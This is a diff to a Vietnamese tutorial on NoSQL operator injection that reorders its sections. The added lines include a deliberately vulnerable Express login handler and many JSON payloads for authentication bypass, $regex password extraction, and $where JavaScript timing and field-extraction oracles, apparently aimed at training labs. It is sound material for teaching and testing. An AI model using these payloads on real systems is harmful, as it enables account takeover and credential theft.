@@ -373,7 +373,31 @@ Có hai kiểu cần tách rõ:
 - Parameter-scoped operator injection: attacker chỉ điều khiển operator bên trong một hoặc nhiều tham số cụ thể, ví dụ `username` hoặc `password`.
 - Top-level query operator injection: attacker điều khiển query object ở cấp root, nên có thể thêm operator top-level như `$where`.
 
-### 4.1. Đưa operator vào request
+### 4.1. Parameter-scoped operator injection
+
+Parameter-scoped operator injection xảy ra khi backend giữ cấu trúc query cố định, nhưng đưa trực tiếp từng value từ request vào từng field của query mà không ép kiểu về string.
+
+Backend JavaScript vulnerable:
+
+```js
+app.post("/login", async (req, res) => {
+  const user = await db.collection("users").findOne({
+    username: req.body.username,
+    password: req.body.password,
+  });
+
+  if (!user) {
+    return res.status(401).send("Invalid username or password");
+  }
+
+  req.session.user = user.username;
+  res.redirect("/my-account");
+});
+```
+
+Ở kiểu này, attacker không điều khiển cả query object. Attacker chỉ làm cho `req.body.username` hoặc `req.body.password` không còn là string, mà trở thành object chứa operator như `{"$ne":"invalid"}` hoặc `{"$regex":"^.*"}`.
+
+#### 4.1.1. Đưa operator vào từng tham số
 
 Trong JSON request, operator có thể được chèn dưới dạng nested object:
 
@@ -402,31 +426,7 @@ Nếu cách này không hoạt động, có thể thử:
 
 Một công cụ chuyển đổi Content-Type có thể hỗ trợ tự động đổi URL-encoded `POST` request sang JSON khi kiểm thử trong lab.
 
-### 4.2. Parameter-scoped operator injection
-
-Parameter-scoped operator injection xảy ra khi backend giữ cấu trúc query cố định, nhưng đưa trực tiếp từng value từ request vào từng field của query mà không ép kiểu về string.
-
-Backend JavaScript vulnerable:
-
-```js
-app.post("/login", async (req, res) => {
-  const user = await db.collection("users").findOne({
-    username: req.body.username,
-    password: req.body.password,
-  });
-
-  if (!user) {
-    return res.status(401).send("Invalid username or password");
-  }
-
-  req.session.user = user.username;
-  res.redirect("/my-account");
-});
-```
-
-Ở kiểu này, attacker không điều khiển cả query object. Attacker chỉ làm cho `req.body.username` hoặc `req.body.password` không còn là string, mà trở thành object chứa operator như `{"$ne":"invalid"}` hoặc `{"$regex":"^.*"}`.
-
-#### 4.2.1. Detect trên từng tham số
+#### 4.1.2. Detect trên từng tham số
 
 Ví dụ một login endpoint nhận JSON body:
 
@@ -450,7 +450,17 @@ Có thể kiểm tra thêm `$regex` trên cùng tham số:
 
 Nếu response vẫn tương ứng với user `wiener`, tham số `username` đang xử lý operator.
 
-#### 4.2.2. Bypass authentication
+#### 4.1.3. Xác định phạm vi điều khiển tham số
+
+Cần kiểm tra từng field riêng lẻ để biết attacker điều khiển operator ở một field hay nhiều field. Ví dụ chỉ kiểm tra `password`:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"}}
+```
+
+Nếu request này thành công nhưng `username` không nhận object operator, phạm vi điều khiển chỉ nằm ở `password`. Nếu cả `username` và `password` đều nhận object operator, impact thường rộng hơn vì có thể loại bỏ nhiều điều kiện xác thực cùng lúc.
+
+#### 4.1.4. Bypass authentication
 
 Nếu cả `username` và `password` đều xử lý operator, authentication có thể bị bypass:
 
@@ -468,7 +478,7 @@ Nếu chỉ `password` xử lý operator, có thể kết hợp username cố đ
 
 Query này chỉ còn yêu cầu username đúng và password không bằng chuỗi `invalid`.
 
-#### 4.2.3. Nhắm vào account cụ thể
+#### 4.1.5. Nhắm vào account cụ thể
 
 Để nhắm vào account cụ thể khi đã biết hoặc đoán được username:
 
@@ -482,7 +492,23 @@ Hoặc dùng `$regex` để match username theo prefix:
 {"username":{"$regex":"admin.*"},"password":{"$ne":""}}
 ```
 
-#### 4.2.4. Extract data trên field đã biết bằng `$regex`
+#### 4.1.6. Xác định length của field đã biết bằng `$regex`
+
+Nếu field cần extract đã biết và field đó xử lý `$regex`, có thể xác định độ dài bằng regex. Ví dụ kiểm tra password dài đúng 8 ký tự:
+
+```json
+{"username":"administrator","password":{"$regex":"^.{8}$"}}
+```
+
+Hoặc kiểm tra password có dài hơn một ngưỡng:
+
+```json
+{"username":"administrator","password":{"$regex":"^.{9,}$"}}
+```
+
+Response khác nhau giữa regex đúng và sai tạo boolean oracle cho độ dài.
+
+#### 4.1.7. Extract data trên field đã biết bằng `$regex`
 
 Với Parameter-scoped operator injection, nếu field cần extract đã biết và tham số đó xử lý `$regex`, có thể brute-force từng ký tự của value bằng regex.
 
@@ -504,9 +530,39 @@ Payload tổng quát:
 {"username":"administrator","password":{"$regex":"^KNOWN_PREFIX§char§"}}
 ```
 
-Giới hạn của kiểu này: vì attacker chỉ điều khiển value của từng field, không thể thêm top-level `$where`. Do đó các kỹ thuật cần `Object.keys(this)`, extract field chưa biết bằng JavaScript, hoặc timing-based `$where` không áp dụng cho Parameter-scoped operator injection thuần túy.
+#### 4.1.8. Blind response-based extraction
 
-### 4.3. Top-level query operator injection
+Khi ứng dụng không trả trực tiếp dữ liệu, vẫn có thể dùng khác biệt response làm oracle. Ví dụ nếu regex đúng thì login thành công hoặc response length khác, còn regex sai thì trả `Invalid username or password`, có thể lặp lại từng ký tự:
+
+```json
+{"username":"administrator","password":{"$regex":"^p"}}
+```
+
+```json
+{"username":"administrator","password":{"$regex":"^q"}}
+```
+
+Ký tự nào tạo response thuộc nhánh đúng thì được giữ lại làm prefix cho vòng tiếp theo.
+
+#### 4.1.9. Blind time-based attack trong phạm vi Parameter-scoped
+
+Parameter-scoped operator injection thuần túy không cho thêm top-level `$where`, nên không có payload JavaScript delay kiểu `sleep(5000)`. Nếu response body bị làm giống nhau, chỉ có thể kiểm tra timing dựa trên chính operator field-level đang kiểm soát, ví dụ so sánh thời gian giữa regex khớp và không khớp:
+
+```json
+{"username":"administrator","password":{"$regex":"^p"}}
+```
+
+```json
+{"username":"administrator","password":{"$regex":"^z"}}
+```
+
+Nếu môi trường tạo độ lệch thời gian ổn định giữa điều kiện đúng và sai, độ lệch đó có thể dùng như blind timing oracle. Nếu không có độ lệch ổn định, timing-based attack không áp dụng cho Parameter-scoped thuần túy; muốn dùng JavaScript delay thì cần Top-level query operator injection với `$where`.
+
+#### 4.1.10. Giới hạn của Parameter-scoped operator injection
+
+Vì attacker chỉ điều khiển value của từng field, các kỹ thuật cần JavaScript context như `Object.keys(this)`, `this[Object.keys(this)[n]]`, hoặc `$where:"sleep(5000)"` không áp dụng trực tiếp. Những kỹ thuật đó thuộc Top-level query operator injection.
+
+### 4.2. Top-level query operator injection
 
 Top-level query operator injection xảy ra khi backend đưa nguyên object do người dùng gửi vào query. Lúc này attacker có thể điều khiển gần như toàn bộ query object, bao gồm cả các operator ở cấp root như `$where`.
 
@@ -531,7 +587,17 @@ app.post("/login", async (req, res) => {
 
 Vì backend dùng nguyên `req.body`, request có thể thêm top-level operator như `$where`. Khác biệt response giữa `Invalid username or password` và `Account locked` tạo tín hiệu để kiểm tra JavaScript expression, extract field name bằng `Object.keys(this)`, hoặc extract token value từng ký tự.
 
-#### 4.3.1. Detect bằng `$where`
+#### 4.2.1. Đưa operator vào query object
+
+Vì toàn bộ `req.body` trở thành query, payload có thể chứa cả field condition và top-level operator:
+
+```json
+{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
+```
+
+Khác với Parameter-scoped operator injection, attacker không bị giới hạn trong value của `username` hoặc `password`.
+
+#### 4.2.2. Detect bằng `$where`
 
 Với login request:
 
@@ -551,7 +617,17 @@ Thêm `$where` như một parameter bổ sung và so sánh false/true condition:
 
 Nếu response khác nhau, JavaScript expression trong `$where` có thể đang được evaluate.
 
-#### 4.3.2. Bypass bằng field operator và top-level condition
+#### 4.2.3. Xác định phạm vi điều khiển query object
+
+Có thể xác nhận quyền điều khiển ở cấp root bằng cách thêm một key top-level không phải field dữ liệu thông thường:
+
+```json
+{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
+```
+
+Nếu `$where:"0"` làm response đổi khác so với `$where:"1"`, payload đang được xử lý ở cấp query object chứ không chỉ ở một field cụ thể.
+
+#### 4.2.4. Bypass bằng field operator và top-level condition
 
 Top-level query operator injection vẫn có thể dùng field operator như `$ne` hoặc `$regex`, vì attacker đang kiểm soát toàn bộ object:
 
@@ -567,27 +643,21 @@ Sau đó có thể thêm `$where` để ràng buộc hoặc quan sát điều ki
 
 Nếu `$where:"1"` và `$where:"0"` tạo response khác nhau, có thể dùng nhánh này cho các kỹ thuật JavaScript introspection.
 
-#### 4.3.3. Timing-based operator injection
+#### 4.2.5. Nhắm vào account cụ thể
 
-Timing-based operator injection dùng cùng ý tưởng delay có điều kiện, nhưng payload được gửi dưới dạng NoSQL operator trong JSON thay vì phá chuỗi JavaScript expression trong một parameter.
-
-Khi ứng dụng không tạo khác biệt rõ ràng trong response body, có thể thử chèn `$where` để tạo delay:
+Có thể cố định username, dùng operator trên password, rồi thêm `$where` nếu cần điều kiện bổ sung:
 
 ```json
-{"username":"admin","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
+{"username":"administrator","password":{"$ne":""},"$where":"1"}
 ```
 
-Nếu response chậm hơn baseline, điều đó cho thấy `$where` đã được xử lý như một operator và JavaScript expression đã được evaluate.
-
-Để biến delay thành boolean oracle, đặt điều kiện vào `$where`. Ví dụ kiểm tra ký tự đầu tiên của password:
+Hoặc match username bằng `$regex`:
 
 ```json
-{"username":"admin","password":{"$ne":"invalid"},"$where":"function(){if(this.password[0]==='a'){sleep(5000)};return true;}"}
+{"username":{"$regex":"admin.*"},"password":{"$ne":""},"$where":"1"}
 ```
 
-Nếu request chỉ chậm khi ký tự đang thử đúng, có thể lặp lại theo từng vị trí và từng ký tự. Khác với timing-based syntax injection, payload ở đây không cần đóng quote của input; nó thêm operator mới vào JSON query.
-
-#### 4.3.4. Extract field name bằng `Object.keys()`
+#### 4.2.6. Extract field name bằng `Object.keys()`
 
 Khi đã chèn được operator cho phép chạy JavaScript, có thể dùng `Object.keys()` để extract tên field.
 
@@ -599,9 +669,19 @@ Ví dụ:
 
 Payload này kiểm tra field đầu tiên của object hiện tại và so khớp ký tự đầu tiên của field name. Bằng cách thay đổi index field, vị trí ký tự, và ký tự thử, có thể extract field name từng ký tự.
 
-#### 4.3.5. Extract dữ liệu field theo index
+#### 4.2.7. Extract data bằng field name đã biết
 
-Với operator injection, nếu có thể chèn top-level `$where`, có thể dùng `this[Object.keys(this)[n]]` để đọc value của field ở một index cụ thể mà không cần biết tên field.
+Khi biết field name, có thể dùng `$where` để kiểm tra value của field đó:
+
+```json
+{"username":"administrator","password":{"$ne":"invalid"},"$where":"this.password.match(/^p/)"}
+```
+
+Nếu điều kiện đúng và sai tạo response khác nhau, có thể brute-force từng ký tự của value.
+
+#### 4.2.8. Extract dữ liệu field theo index
+
+Nếu chưa biết tên field nhưng biết index trong `Object.keys(this)`, có thể dùng `this[Object.keys(this)[n]]` để đọc value của field đó.
 
 Ví dụ xác định độ dài value của field ở index `2`:
 
@@ -621,27 +701,39 @@ Payload tổng quát:
 {"username":"administrator","password":{"$ne":"invalid"},"$where":"this[Object.keys(this)[FIELD_INDEX]].match(/^.{POSITION}CHAR/)"}
 ```
 
-Khác với syntax injection, payload ở đây không cần đóng chuỗi input ban đầu. `$where` được thêm như một operator mới trong JSON query.
+#### 4.2.9. Extract data bằng `$regex`
 
-#### 4.3.6. Extract data bằng `$regex`
-
-Trong Top-level query operator injection, `$regex` vẫn có thể dùng trên field đã biết giống Parameter-scoped operator injection. Ví dụ login request:
-
-```json
-{"username":"myuser","password":"mypass"}
-```
-
-Thử xem `$regex` có được xử lý trên `password` không:
+Trong Top-level query operator injection, `$regex` vẫn có thể dùng trên field đã biết giống Parameter-scoped operator injection. Ví dụ:
 
 ```json
 {"username":"admin","password":{"$regex":"^.*"}}
 ```
 
-Nếu response khác với response khi gửi password sai, ứng dụng có thể vulnerable. Sau đó có thể dùng `$regex` để kiểm tra dữ liệu từng ký tự, ví dụ:
+Nếu response khác với response khi gửi password sai, ứng dụng có thể vulnerable. Sau đó có thể dùng `$regex` để kiểm tra dữ liệu từng ký tự:
 
 ```json
 {"username":"admin","password":{"$regex":"^a*"}}
 ```
+
+#### 4.2.10. Blind time-based attack bằng `$where`
+
+Timing-based operator injection dùng cùng ý tưởng delay có điều kiện, nhưng payload được gửi dưới dạng NoSQL operator trong JSON thay vì phá chuỗi JavaScript expression trong một parameter.
+
+Khi ứng dụng không tạo khác biệt rõ ràng trong response body, có thể thử chèn `$where` để tạo delay:
+
+```json
+{"username":"admin","password":{"$ne":"invalid"},"$where":"sleep(5000)"}
+```
+
+Nếu response chậm hơn baseline, điều đó cho thấy `$where` đã được xử lý như một operator và JavaScript expression đã được evaluate.
+
+Để biến delay thành boolean oracle, đặt điều kiện vào `$where`. Ví dụ kiểm tra ký tự đầu tiên của password:
+
+```json
+{"username":"admin","password":{"$ne":"invalid"},"$where":"function(){if(this.password[0]==='a'){sleep(5000)};return true;}"}
+```
+
+Nếu request chỉ chậm khi ký tự đang thử đúng, có thể lặp lại theo từng vị trí và từng ký tự. Khác với timing-based syntax injection, payload ở đây không cần đóng quote của input; nó thêm operator mới vào JSON query.
 
 ## 5. Case study
 
